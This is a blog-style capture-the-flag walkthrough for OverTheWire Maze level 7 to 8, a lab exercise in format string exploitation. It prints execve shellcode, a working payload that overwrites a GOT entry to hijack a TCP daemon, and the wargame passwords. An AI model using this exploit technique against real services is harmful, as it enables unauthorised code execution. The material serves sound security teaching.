---
date: 2023-09-25 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 7 → 8 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-7-to-8/
tags: [overthewire, maze, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Maze Level 7 → 8!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Maze-Level-6-to-7/' | relative_url }}">← Previous: Level 6 → 7</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze8.html" target="_blank" rel="noopener">
      Official (Level 8) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-8-to-9/' | relative_url }}">Next: Level 8 → 9 →</a>
  </div>
</nav>

## Login

Use the **maze7** account from the previous level.

```bash
ssh maze7@maze.labs.overthewire.org -p <PORT>
# password: pohninieng
```

> Binary for this challenge: `/maze/maze8` (simple TCP server; default port **1337**, or pass a custom port as argv\[1]).

---

## Task

Exploit a **format string vulnerability** in the network handler to hijack control flow and execute shellcode, then read `/etc/maze_pass/maze8`.

---

## A little bit of Theory

The program is a tiny TCP daemon:

* Binds to `0.0.0.0:1337` (or the port you supply), `listen()`s, `accept()`s, then asks:

  ```
  "Give the correct password to proceed: "
  ```
* It compares your input with the hardcoded string `"god"`.
* If the answer is wrong, it builds a response like:

  ```c
  snprintf(replybuf, 512, buf);
  strcat(replybuf, " is wrong ^_^\n");
  ```

  **Bug:** `buf` (your input) is used **as the format string**. That’s classic **format string vuln** → arbitrary memory reads/writes via `%x`, `%n`, `%hn`, …

Strategy:

* Overwrite a GOT/PLT entry to **redirect execution** into our **env shellcode**.
* A convenient target is `strlen@plt` (stub jumps through GOT). Its PLT stub does: `jmp [GOT(strlen)]`. If we overwrite `GOT(strlen)` with an address inside our shellcode (e.g. env `$SC`), any `strlen()` call transfers control to us.

We’ll do a **two-half `%hn` write**:

* Let `GOT(strlen) = 0x08049d34`. We write the low 2 bytes and high 2 bytes separately to `0x08049d34` and `0x08049d36`.
* Choose shellcode address `0xffffdf0c` (common env offset here; adjust if needed).

  * Low half (LOB) = `0xdf0c` (decimal **57100**, but we must account for already printed bytes)
  * High half (HOB) = `0xffff`

Because the PLT stub pushes 4 bytes etc., we must craft the padding precisely. We’ll put the two addresses first in our payload, then use `%hn` with the right field widths to paint each half.

---

## Walkthrough

### 1) Put shellcode in the environment

```bash
export SC=$(python - <<'PY'
print("\x90"*100 +
      "\x31\xc0\x50\x68\x2f\x2f\x73\x68" +
      "\x68\x2f\x62\x69\x6e" +
      "\x89\xe3\x89\xc1\x89\xc2" +
      "\xb0\x0b\xcd\x80" +
      "\x31\xc0\x40\xcd\x80")
PY
)
```

This gives us a NOP sled + `/bin//sh` **execve** shellcode. A typical landing address in these levels is around `0xffffdf0c`—confirm in `gdb` if needed with `x/s getenv("SC")`.

### 2) Run the server

In one terminal:

```bash
/maze/maze8          # listens on 1337 by default
# or: /maze/maze8 1337
```

### 3) Build the format-string payload

We’ll place the two GOT addresses first, then format ops:

* `0x08049d34` (GOT(strlen) low half)
* `0x08049d36` (GOT(strlen) high half)

The **stack offset** for our first address is `1` on this target (you can verify by sending `AAAA %x %x ...` and spotting where `41414141` shows up).
We need to print exactly:

* `LOB` bytes before the first `%hn`
* Then `HOB - LOB` more bytes before the second `%hn`

Accounting for the 8 bytes already “printed” by placing two 4-byte addresses at the start of the payload, one workable payload is:

```bash
python - <<'PY' | nc 127.0.0.1 1337
import sys
payload  = "\x34\x9d\x04\x08"   # &GOT(strlen)
payload += "\x36\x9d\x04\x08"   # &GOT(strlen)+2
payload += "%57092x%1$hn%8435x%2$hn"
sys.stdout.write(payload)
PY
```

Why those widths?

* We target `0xffffdf0c`.
* First write (`%1$hn`) should set **low half** to `0xdf0c`:

  * `0xdf0c` = **57100**; we already “printed” **8** bytes (two addresses), so we print **57100 - 8 = 57092** chars before `%1$hn`.
* Second write (`%2$hn`) should set **high half** to `0xffff`:

  * We’re at **57100** now; to reach **65535**, print **65535 - 57100 = 8435** more chars, then `%2$hn`.

When the daemon later calls `strlen()`, control **jumps to our env** and the shellcode runs.

### 4) Pop the shell & read the password

If the overwrite lands correctly, you’ll get a shell as user **maze8**. Then:

```bash
id
cat /etc/maze_pass/maze8
```

In my run, the password was:

```
jopieyahng
```

---

## Why this works (tl;dr)

* Using your input as the *format string* makes `snprintf()` interpret `%` directives you control.
* `%hn` writes the number of characters printed so far **into the address** you select.
* Two `%hn` writes paint the **GOT(strlen)** pointer with your shellcode address (low then high half).
* Next call to `strlen()` jumps into `$SC` → **/bin/sh**.

---

## Troubleshooting quick tips

* **Wrong stack offset?**
  Send `AAAA %x %x %x ...` to the server; count until you see `41414141`. Use that index as the `$N` in `%N$hn`.
* **Shellcode address off by a bit?**
  Use `gdb` and `x/ s getenv("SC")` to get the exact address (pick somewhere in the NOP sled) and recompute the two field widths.
* **Server dies immediately?**
  Make sure you’re connecting while it’s listening, and that your payload goes via **netcat** (no newline mangling).
* **ASLR pain?**
  The env address is fairly stable on this box for these levels; if it shifts, re-measure and adjust the two widths.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
